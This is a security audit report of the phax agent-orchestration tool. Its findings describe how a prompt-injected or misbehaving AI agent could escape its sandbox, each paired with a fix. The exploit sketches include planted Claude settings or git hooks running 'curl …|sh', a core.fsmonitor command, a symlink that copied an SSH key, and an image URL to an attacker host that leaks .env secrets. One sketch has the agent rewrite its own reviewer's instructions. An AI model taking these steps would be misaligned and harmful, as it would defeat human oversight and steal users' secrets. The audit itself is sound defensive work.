# phax security audit — 2026-11-23

**Scope:** whole repository at `e5c39af` (v0.43.0): `src/` (600 files, ~116k lines), the npm launcher (`npm/`), `packages/schemas`, `scripts/` (including the security toolkit), and `.github/workflows`.

**Method:** the audit was split into five areas, each reviewed by its own agent:
- subprocess and argument injection
- agent confinement
- filesystem and path safety
- untrusted data flows (agent output, GitHub, config, telemetry, terminal)
- supply chain and CI

Each finding was traced from source to sink. Many were reproduced with small scripts against the real code (`pnpm exec tsx`) or real git 2.43. I then re-checked the headline findings against the code myself.

**Not run:** the provider CLIs (claude, codex, vibe) were not run, so any finding that depends on how a provider behaves is marked *plausible*. gitleaks and osv-scanner were not installed. The repository was not modified.

**Threat model.** `SECURITY.md` and `docs/security.md` set it out: "a phase's agent reaching what its security mode should deny is a phax vulnerability". The attackers considered were:
- (a) a prompt-injected or misbehaving agent;
- (b) third parties on GitHub;
- (c) a compromised supply chain.

`phax.json` counts as trusted project configuration. Residual risks the docs already accept are **not** re-reported:
- allowed shell commands on Claude Code and Vibe run with the user's rights;
- prefix allowlists accept extra arguments, such as `git diff --output=`;
- no provider filters by domain;
- clean filters and `status.json` edits defeat the protected-path check.

**Baseline checks: all clean.**
- `pnpm audit` over all 558 packages, and `--prod`: 0 advisories.
- No git or tarball dependencies; every lockfile entry has an integrity hash.
- No secrets found in tracked files or in deleted history (pattern scan).
- All GitHub Actions are pinned to a full SHA.
- No `pull_request_target`, no `${{ }}` interpolated into `run:`, and fork PRs get no secrets.
- No shell strings or `shell: true` anywhere; every subprocess runs from an argv array.
- `pnpm audit:security` reports 0 high, 0 medium, 4 low. It has fail-open bugs of its own (SEC-19).

**Main theme.** The confinement of a single turn is well built. The weak points are the places where one turn's output turns into the next process's configuration or code:
- `.claude/settings.json`
- git hooks and the worktree's `.git` pointer
- the `.phax-context/` symlink
- the review skill
- the brief provider's `phax.json`
- the resumed run's security mode

phax itself, running outside any sandbox, reads or runs those artifacts later. That is how an agent confined in one turn reaches past its sandbox.

## High

### SEC-01 — A phase agent can plant Claude Code project settings or hooks that later sessions load, escaping the sandbox and widening the allowlist
*Confirmed in code; Claude Code's merge behaviour is plausible.*

**How it works:**
- Headless Claude sessions run with `--setting-sources project`, which loads the worktree's `.claude/settings.json`: `permissions.allow` and `hooks` (`src/domain/session/claudeProjectOnly.ts`).
- phax's `--allowedTools` only adds rules on top (`src/domain/session/claudePermissionFlags.ts:85-130`).
- Nothing in `src/` reads or checks that file.
- `.claude/**` is not implicitly protected. Only the loaded `phax.json` is (`src/domain/security/protectedPaths.ts:146`).

**Exploit:**
1. A phase runs on **Codex**. Its OS sandbox lets it write anywhere in the worktree, including `.claude/`, and phax rates Codex's protected-path enforcement as `commit-check-only`.
2. The agent commits `.claude/settings.json` with `"permissions":{"allow":["Bash"]}` and a `SessionStart` hook running `curl …|sh`.
3. `git add -A` commits the file, and the next phase's worktree branches from it.

**Result:** the next phase on Claude Code, `phax review-code` (including the "read-only" reviewer) and `phax enter` all load the file. The hook runs with the user's rights, outside any sandbox, and the secure phase gets an unrestricted shell.

**Not new for all-Claude runs:** there, Claude Code already guards `.claude/` against writes. The new part is the escalation out of Codex's sandbox and out of read-only sessions.

**Not recorded:** `security.json` shows none of this.

**Gaps in the same class:**
- `phax.local.json`: it outranks `phax.json` for security profile, network and MCP, and is not gitignored in the target repository.
- A nested `phax.json`.
- `.mcp.json`, `.codex/**` and `.vibe/**` in the worktree.

**Fix:**
- Treat `.claude/**`, `CLAUDE.md`, `.mcp.json`, `.codex/**`, `.vibe/**`, `**/phax.json` and `**/phax.local.json` as implicitly protected in every run.
- Or refuse a Claude session whose `.claude/settings*.json` differs from the run's base commit.
- Or launch with `--setting-sources ""` plus explicit `--settings`.
- Vibe already has a narrower version of this refusal (`mistralVibe.ts:136-150`).

### SEC-02 — "Skeleton" records (`records.transcript: false`) still carry full agent transcripts and are allowed onto public repos
*Confirmed by running `assembleRecord`.*

**How it works:**
- `selectRecordArtifacts` treats only `output.jsonl` as a transcript (`src/domain/records/assemble.ts:17,50`).
- The same agent session's resumed turns write their raw stream-json into other files in the phase folder:
  - `fix-attempt-NN.jsonl`, written via `fixTranscriptName`, `src/app/fixLoop.ts:571`;
  - `handoff-generation.jsonl`, `src/app/handoffGeneration.ts:152`.
- Those files hold tool calls, the contents of files the agent read, and command output.

**What gets published:** with `transcript:false` the record shape is `skeleton`, but its artifacts still include those transcripts. They also include:
- `checks-attempt-NN.log` (gate output);
- `agent-error.log` (stderr; on Vibe, the full prompt in argv);
- `security.json` and `status.json` (absolute paths and the username);
- `claude-session-id.txt`.

**Why that reaches a public repo:** `decideRecordsDestination` allows an in-repo destination whatever the repo's visibility once `transcript` is false (`src/domain/records/destination.ts:62-66`). `publishRun` then pushes `phax/records/v1` (`src/app/publishRun.ts:323-341`).

**Exploit:** a user on a public repo turns on records with transcripts off, believing no transcript leaves the machine. Every phase that needed a fix attempt publishes what the agent read: `.env` contents, tokens printed by tests, and so on.

**Fix:**
- Build phase records from an allowlist, as revision and decision records already are.
- Count `fix-attempt-*.jsonl`, `handoff-generation.jsonl`, `*.vibe-export` and probably the gate logs and `agent-error.log` as transcript-class.
- Add a test that lists the full contents of a phase folder.

## Medium

### SEC-03 — `phax brief` (allowlisted in every phase when `brief` is configured) runs a command from an agent-written `phax.json`
*phax side confirmed by a PoC run; Claude side plausible.*

**How it works:**
- Every secure phase gets `Bash(phax brief:*)` (`src/app/executePlan.ts:1197-1198`).
- `phax brief` finds the main checkout by running git discovery from its cwd. When git's common dir is not named `.git`, it falls back to the current root and loads `phax.json` from there (`src/cli/definitions/brief.ts:70-78`, `src/app/loadConfig.ts:417-426`). `phax architecture` has the same pattern.

**Exploit, using only the Write tool:**
1. Create a fake bare repo `n/{HEAD,objects,refs,config}` with `core.worktree=…/n/w`.
2. Write `n/w/phax.json` containing `"brief":{"command":"sh payload.sh"}`.
3. Run `cd n && phax brief w/x`.

phax then runs `payload.sh` with the user's rights.

**Reproduced:** with `pnpm exec tsx src/cli/main.ts brief w/x`, the payload wrote its marker file. Whether Claude Code lets the `cd` run together with the allowed command was not tested.

**Fix:** pass the main root and config path to the agent's environment (for example `PHAX_MAIN_ROOT`) and have `brief`/`architecture` use only those. Or refuse unless the tree is a linked worktree that holds `.phax-context/brief-request.json`.

### SEC-04 — `phax resume` ignores the run's security mode: a silent downgrade to unsafe and a stale `security.json`
*Confirmed.*

**How it works:**
- `src/cli/definitions/resume.ts:317` calls `executePlan` with no `securityMode`.
- `executePlan.ts:495` then falls back to `config.security.profile`.
- `run-status.json` does not store the mode.
- A resumed phase rebuilds its policy from the current config and does not rewrite `security.json`.
- The unsafe banner prints only from `run.ts:302`.

**Exploit:**
1. The config says `profile: "unsafe"` (in `phax.json` or `phax.local.json`), and the user runs `phax run --security secure`.
2. The run pauses, for example on a rate limit or a failed gate.
3. `phax resume --yes` runs the remaining phases with `bypassPermissions` / `--dangerously-bypass-approvals-and-sandbox`, prints no warning, and leaves `security.json` saying `secure`.

Any config edit made between run and resume (`allowWrite`, `agentCommands`, `mcp`) also applies without being recorded.

A related case: `profile: "isolated"` is refused by `run` but accepted by `resume`.

**Fix:**
- Store the effective mode, or the whole policy, in `run-status.json`.
- On resume, rebuild the policy from each phase's `security.json` (`policyFromPosture` already exists).
- Refuse or warn when the current config differs, and print the unsafe banner on resume too.

### SEC-05 — Codex: MCP policy is not enforced, but is recorded as enforced
*Confirmed in code.*

**The gap:**
- `buildCodexSecurityFlags` emits nothing for MCP; the code comment admits it (`src/domain/session/codexFlags.ts:88-92`).
- `capabilities.ts:22` declares `mcpAllowlist: "supported"`, and the docs table says "Supported".
- The `mcp-unenforced` mark is defined but never set for Codex.

**Consequence:** under the default `mcp.mode: "disabled"`, Codex still loads every `[mcp_servers]` entry from `~/.codex/config.toml`. Those servers run outside the workspace-write sandbox. Meanwhile `security.json` says `mcp: disabled` with `marks: []`.

**Fix:** pass `-c mcp_servers={}` in secure mode, and only the allowlisted servers in allowlist mode. Until that ships, mark the session `mcp-unenforced` and change the capability to `unsupported`.

**Probe needed:** whether a worktree's `.codex/config.toml` is loaded when the main repository is trusted. If so, it is another SEC-01-style path.

### SEC-06 — phax's own `git commit` runs repository hooks an agent can edit
*Confirmed with git 2.43.*

**How it works:**
- The phase commit (`src/infra/git.ts:938-941`) and the stop-close `commitTreeEffect` (`git.ts:503-512`) run `git commit` with hooks enabled.
- With a tracked `core.hooksPath`, as with husky's `.husky/_`, git resolves hooks against the worktree. The hook scripts are therefore ordinary files that every provider may write, Codex's sandbox included.

**Exploit:** the agent writes `.husky/pre-commit` containing `curl …|sh`. phax runs it with the user's rights at the phase commit. That includes the commit-only resume and stop closes, where no gate step runs first.

**Fix:** commit with `-c core.hooksPath=/dev/null` or `--no-verify`. Or refuse when the hooks directory changed since the phase base. At minimum, document this next to the gate-step residual.

### SEC-07 — A rewritten worktree `.git` pointer file makes phax's git calls run agent-chosen config (`core.fsmonitor`)
*git side confirmed; per-provider write protection plausible.*

**How it works:**
- The agent replaces the worktree's `.git` file with `gitdir: ./x`.
- It creates `x/{HEAD,config}` with `core.fsmonitor=<cmd>`.
- The next `git status`/`add`/`diff` phax runs in that worktree executes the command, including the protected-path observation after every turn.

**Reproduced:** `git status --porcelain` ran the command.

**Which providers are exposed:** Vibe's `write_file`/`edit` denylist does not cover `.git` (`src/domain/session/vibeFlags.ts:127-134`). Claude Code most likely protects `.git` already; Codex's coverage of a `.git` *file*, as opposed to a directory, is unverified.

**Fix:**
- Run worktree git calls with explicit `GIT_DIR`/`GIT_WORK_TREE` (the path phax created) and `-c core.fsmonitor=false`.
- Check the `.git` file's content before each step.
- Add `.git` to the native deny rules.

### SEC-08 — A `.phax-context` symlink makes phax read and write outside the worktree
*Confirmed with the real filesystem layer.*

**How it works:**
- The ignore rule `.phax-context/` only matches directories, so a symlink named `.phax-context` gets committed and lives on in every later phase.

**What phax does through it:**
- `mkdirp` and `writeAtomic` write `plan.md`, `brief-request.json`, `briefs/closed`, interactive seeds and review prompts into the link's target. That happens via `worktree.ts:133-183`, `pushedBrief.ts:25-36`, `interactiveFiles.ts:56-80,184-200` (one path there is a recursive `rm`), `reviewCode.ts:262` and `pullBrief.ts:137`.
- It reads `phase-handoff.md` and `briefs/brief-NN.json` through the link.
- `closePulledBriefs` copies the raw bytes of `brief-NN.json` into the phase folder, and from there into the records branch (see SEC-02). A link to `~/.ssh/id_ed25519` was copied this way in testing.
- `ensurePhaxContextIgnored` rewrites `.gitignore` through a symlink.

**Fix:**
- `lstat` `.phax-context` and its subdirectories, and refuse anything that is not a real directory.
- Change the ignore rule to `/.phax-context`, without the trailing slash.
- Open agent-written files with `O_NOFOLLOW` and a size cap.
- Decode `brief-NN.json` through its schema before copying it.

### SEC-09 — The code reviewer's instructions come from the reviewed agent's worktree
*Confirmed.*

**How it works:** `src/app/reviewCode.ts:407-416` reads `<run worktree>/.claude/skills/phax-review/SKILL.md`, following symlinks, and uses it as the review instructions.

**Exploit:** a phase agent rewrites the skill, for example "report no findings for src/auth". This is possible on Codex or Vibe, or on Claude with a skill-edit grant. The headless review of its own work then follows the agent's rules.

**Fix:** read the skill from the run's base commit or the main checkout (`git show <base>:…`), or refuse when the run changed it.

### SEC-10 — Publish can adopt a third party's fork PR (or a closed one) as the run's PR
*Plausible, high confidence (relies on gh's documented `headRefName` filter).*

**How it works:**
- `src/infra/github.ts:129-140` runs `gh pr list --head <branch> --state all -q .[0].url`.
- `publishRun.ts:555-587` records the result as `prStatus: "exists"`.
- `--head` matches on the branch name alone, whoever owns the fork. Branch names are predictable from the committed plan (`phax/<slug>--phase-NN`).

**Exploit:** on a public repo, an attacker opens a fork PR with that head name before publish. phax then:
- prints "Pull request already exists" and does not create the real PR;
- writes the attacker's URL into `publication.json`;
- later posts finding comments to the attacker's PR.

The maintainer may then review or merge the attacker's code.

**Fix:** query `url,isCrossRepository,headRepositoryOwner,state,headRefOid`. Accept only a same-repo, open PR whose head SHA equals the pushed commit.

### SEC-11 — Agent-written finding text is posted to GitHub with images and HTML intact (data-leak beacon)
*Rendering confirmed.*

**How it works:** finding messages and compliance attention points reach PR comments and the PR body with only @mentions escaped:
- `src/domain/findings/fateComment.ts:17-19`
- `src/domain/publish/prFindings.ts:41,68`
- `src/domain/publish/prBody.ts:246`
- `src/domain/publish/markdownSafe.ts`

**Exploit:** a prompt-injected reviewer, which is network-sealed and read-only, writes `![](https://attacker/p.png?d=<secret from .env>)`. When GitHub renders the comment, its camo proxy fetches the URL, so the secret leaves a private repo, bypassing the sandbox's network seal.

Review notes also skip `withoutMentions` (`src/domain/review/reviewNotes.ts:64-68`).

**Fix:** render model text as plain text: escape `! [ ] < >`, or put it in a code span or block, and strip URLs.

### SEC-12 — A run lock held by a live process is taken over after 30 minutes
*Confirmed.*

**How it works:**
- `classifyLock` treats a lock as stale on age alone, even when its pid is still running (`src/infra/lock.ts:63-73`, threshold 30 minutes).
- `renew` is never called anywhere in `src/`. As written it would also leak a file handle.
- `release` deletes whatever lock is there, without checking who owns it.

**Exploit / accident:** a turn or gate runs longer than 30 minutes. The user then runs `phax reset-phase` or `resume`, which takes the lock. `reset-phase` runs `git worktree remove --force` and `branch -D` on the worktree the live agent is still writing to. That breaks the documented promise that reset never removes a running turn's worktree.

**Also:** two processes that both see a stale lock can each believe they hold it.

**Fix:**
- Never treat a lock as stale while its pid is alive, or renew it on a timer.
- Store an owner token in the lock and compare it before unlinking.

### SEC-13 — npm launcher: the checksum comes from the same mutable release as the binary
*Confirmed.*

**How it works:** `npm/bin/phax:33-41,132-157,211-218` downloads both `phax-<os>-<arch>` and `.sha256` from `github.com/lbdremy/phax/releases/download/v<ver>/`. That proves the file arrived intact, not who made it. The launcher never checks the Sigstore attestation, and the npm tarball pins no digest.

**Exploit:** anyone who can edit release assets swaps both files on an existing release, and every new install runs the substitute. That includes a stolen PAT, a collaborator, or a malicious devDependency running in the release job (SEC-14).

**Fix:**
- Have `prepare-npm.ts` embed the SHA-256 digests in the npm package, and verify against those. The approved, provenance-signed tarball then pins the binaries.
- Turn on GitHub immutable releases.

### SEC-14 — The release job runs ~500 devDependencies with write, OIDC and deploy credentials in scope
*Setup confirmed; impact plausible.*

**How it works:** in `.github/workflows/release.yml`, a single job does all of:
- `pnpm install`;
- the full gate (vitest, oxlint, knip, the site build);
- the binary build and attestation;
- the Cloudflare deploy and the npm publish.

It does this with `contents: write`, `id-token: write`, the default `persist-credentials` (the token is left in `.git/config`) and `CLOUDFLARE_API_TOKEN`.

**What a compromised dev dependency could do:**
- overwrite past release assets (feeding SEC-13);
- mint an OIDC token and try a direct `npm publish`;
- steal the Cloudflare token;
- tamper with `dist/release/*` before attestation, so the tampered binaries get a valid attestation.

**Fix:**
- Split into a build/test job with `contents: read`, no `id-token` and `persist-credentials: false`.
- Add a minimal attest/publish job that only downloads the artifacts, with no `pnpm install`.
- Move the deploy to its own job behind a protected `environment:`.
- In npm's trusted-publisher settings, allow only staged publishes.

### SEC-15 — The skill-edit grant hook relies only on Claude Code's `if` field to stay scoped
*Plausible.*

**How it works:** each handler in `src/infra/providers/claudeSkillEditSettings.ts:22-31` is a constant `echo '<allow>'` under `matcher: "Edit|Write|MultiEdit"`. phax checks no minimum Claude Code version.

**Risk:** a Claude Code build that ignores `if` would approve *every* Edit/Write permission request in runs with `--allow-skill-edits`. That includes writes outside the working directories; deny rules still win.

**Lesser issue:** a declared path that is actually a directory (`.claude/skills/x`) likely grants every file under it.

**Fix:**
- Make the hook read `tool_input.file_path` from stdin and compare it itself, so it fails closed.
- Probe a minimum `claude --version`.
- Refuse grants that resolve to a directory.

## Info / hardening

- **SEC-31 Revision arguments are not fenced:** they sit before any `--` and without `--end-of-options` (`git.ts` `listCommitFiles`, `readTree`, `readBlob`, `changedFilesSince`, …). Safe today only because every source is a validated SHA. The one value read from repository data, `recordsExplain.ts:459` with `merge-base --is-ancestor <record.commit>`, has no option that writes. Brand `CommitSha`/`TreeId` at the port and add `--end-of-options`.
- **SEC-32 Push remote outside the `--` fence:** `git push --set-upstream <remote> -- <branch>` leaves `remote` before the separator (`git.ts:1027`); it comes from trusted `publish.remote`. Validate it (no leading `-`).
- **SEC-33 Agent rule text is not escaped:** `gateCommandAllowRules` builds `Bash(<cmd>:*)` without escaping `( ) ,` (`claudePermissionFlags.ts:59-67`); commands come from config. Refuse those characters, as phax already refuses `*` in partial commands.
- **SEC-34 Full environment passed to agents and gates:** every agent and gate child inherits the whole environment (`GH_TOKEN`, cloud credentials). On Codex with network enabled, the agent can send them out. Consider an env denylist.
- **SEC-35 Unchecked destructive targets from state files:** `prune` runs `rm -rf` on `registry.json`'s `archivePath` without a root check (`prune.ts:174,274`), and `reset-phase` deletes the branch named in `status.json`. Add an `isUnderRoot` check and an expected-branch check.

## Verified as sound

- **Subprocesses:** argv everywhere, no shell strings.
- **Gate and setup commands:** split on whitespace and run without a shell.
- **Branch names:** `BranchNameSchema` rejects a leading `-`, whitespace and control characters, and run branches are `phax/[a-z0-9-]`.
- **git `--` separators:** used on branch, worktree, clone and fetch calls.
- **gh:** values cannot become flags, and bodies go through `--body-file`.
- **Names and ids:**
  - Run, phase and namespace names are restricted to `^[a-z][a-z0-9-]*$` and `phase-\d{2}`.
  - Plan paths refuse `..`, absolute paths and backslashes.
  - Session ids are checked against `SAFE_SESSION_ID` before any path is built.
- **File writes:**
  - `writeAtomic` uses a temp file and rename, so it never writes through a symlink at the final name.
  - Locks and exclusive files use `wx`.
- **Config and YAML parsing:**
  - The `yaml` core schema has no custom tags, and alias bombs are bounded.
  - A `__proto__` key becomes an own property, so there is no prototype pollution.
  - Overlays are merged field by field.
  - Unknown security values are rejected, and the default is secure.
  - Overlays cannot carry `protectedPaths`.
- **Provider argv:**
  - Codex `-c` values are JSON-encoded, which is valid TOML.
  - `VIBE_TOOLS` is built with `JSON.stringify`.
  - Claude and Codex take the prompt on stdin.
- **Read-only sessions:** really read-only on all three providers, and unsafe mode is ignored for them.
- **Vibe post-turn config check:** fails closed.
- **Protected-path check:** reads objects as stored (no replace refs), uses a temporary index, ignores case, and fails closed on symlinks and nested repos.
- **Telemetry:** local only; no OTLP exporter exists, and a repo cannot configure an endpoint.
- **GitHub:** phax never feeds third-party PR or issue text into prompts or decisions.
- **Decide:** cannot flip a status or approval (`firstRevisionViolation`).
- **CI and supply chain:**
  - Actions are pinned to SHAs.
  - No `pull_request_target`.
  - `env:`-mediated inputs.
  - Fork PRs get no secrets.
  - npm publishing uses OIDC, provenance and staged publish.
  - Install scripts are restricted by `allowBuilds`.
  - The launcher's platform strings come from a fixed table, and the cache lives under `$HOME`.
